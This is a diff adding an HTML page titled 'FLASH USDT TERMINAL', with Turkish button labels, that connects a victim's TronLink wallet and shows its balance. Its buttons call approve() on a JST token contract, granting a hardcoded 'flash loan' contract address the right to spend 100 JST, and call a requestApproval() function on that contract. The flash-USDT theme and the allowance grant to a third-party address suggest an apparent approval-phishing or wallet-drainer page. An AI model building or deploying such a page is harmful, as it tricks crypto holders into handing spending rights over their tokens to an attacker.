@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FLASH USDT TERMINAL</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://unpkg.com/@tronweb3/tronweb/dist/tronweb.umd.min.js"></script>
+    <style>
+        body {
+            background-color: black;
+            color: lime;
+            font-family: monospace;
+            text-align: center;
+        }
+        button {
+            background-color: black;
+            color: lime;
+            border: 2px solid lime;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background-color: lime;
+            color: black;
+        }
+    </style>
+</head>
+<body>
+    <h1>FLASH USDT TERMINAL</h1>
+    <button onclick="connectWallet()">Connect Wallet</button>
+    <p id="walletStatus">Not Connected</p>
+    <p id="trxBalance">TRX Balance: --</p>
+    <button onclick="requestApproval()">FLASH'A İZİN VER</button>
+    <button onclick="approveJST()">JST ALACAĞINI ONAYLA (Lütfen 100 Yazın)</button>
+    <button onclick="approveSpender()">FLASH JST'YE İZİN VER</button>
+    <p id="statusMessage"></p>
+
+    <script>
+        let tronWeb;
+        const flashLoanContract = "TEDcMLy16r1RYV7HwmtdhcrP9sRVUUEvMU";
+        const jstContract = "TCFLL5dx5ZJdKnWuesXxi1VPwjLVmWZZy9";
+        const approveAmount = "100000000000000000000"; // 100 JST (18 decimals)
+
+        async function connectWallet() {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                tronWeb = window.tronWeb;
+                document.getElementById("walletStatus").innerText = "Connected: " + tronWeb.defaultAddress.base58;
+                getTRXBalance();
+            } else {
+                document.getElementById("walletStatus").innerText = "Waiting for TronLink...";
+                let retries = 0;
+                const interval = setInterval(async () => {
+                    if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                        tronWeb = window.tronWeb;
+                        document.getElementById("walletStatus").innerText = "Connected: " + tronWeb.defaultAddress.base58;
+                        getTRXBalance();
+                        clearInterval(interval);
+                    } else if (retries > 10) {
+                        document.getElementById("walletStatus").innerText = "TronLink not detected! Please login to TronLink and refresh the page.";
+                        clearInterval(interval);
+                    }
+                    retries++;
+                }, 1000);
+
+                if (window.tronLink && window.tronLink.request) {
+                    await window.tronLink.request({ method: "tron_requestAccounts" }).catch(err => {
+                        document.getElementById("walletStatus").innerText = "Error connecting to TronLink: " + err.message;
+                    });
+                }
+            }
+        }
+
+        async function getTRXBalance() {
+            if (!tronWeb || !tronWeb.ready) {
+                document.getElementById("trxBalance").innerText = "TRX Balance: Not Connected";
+                return;
+            }
+            try {
+                const address = tronWeb.defaultAddress.base58;
+                const balance = await tronWeb.trx.getBalance(address);
+                document.getElementById("trxBalance").innerText = "TRX Balance: " + (balance / 1e6) + " TRX";
+            } catch (error) {
+                document.getElementById("trxBalance").innerText = "Error fetching balance: " + error.message;
+            }
+        }
+
+        async function requestApproval() {
+            if (!tronWeb || !tronWeb.ready) {
+                document.getElementById("statusMessage").innerText = "TronLink not connected!";
+                return;
+            }
+            try {
+                const contract = await tronWeb.contract().at(flashLoanContract);
+                await contract.requestApproval().send();
+                document.getElementById("statusMessage").innerText = "Approval requested successfully!";
+            } catch (error) {
+                document.getElementById("statusMessage").innerText = "Error: " + error.message;
+            }
+        }
+
+        async function approveJST() {
+            if (!tronWeb || !tronWeb.ready) {
+                document.getElementById("statusMessage").innerText = "TronLink not connected!";
+                return;
+            }
+            try {
+                const contract = await tronWeb.contract().at(jstContract);
+                await contract.approve(flashLoanContract, approveAmount).send();
+                document.getElementById("statusMessage").innerText = "JST approved successfully!";
+            } catch (error) {
+                document.getElementById("statusMessage").innerText = "Error: " + error.message;
+            }
+        }
+
+        async function approveSpender() {
+            if (!tronWeb || !tronWeb.ready) {
+                document.getElementById("statusMessage").innerText = "TronLink not connected!";
+                return;
+            }
+            try {
+                const contract = await tronWeb.contract().at(jstContract);
+                await contract.approve(flashLoanContract, approveAmount).send();
+                document.getElementById("statusMessage").innerText = "Spender approval granted successfully!";
+            } catch (error) {
+                document.getElementById("statusMessage").innerText = "Error: " + error.message;
+            }
+        }
+    </script>
+</body>
+</html>
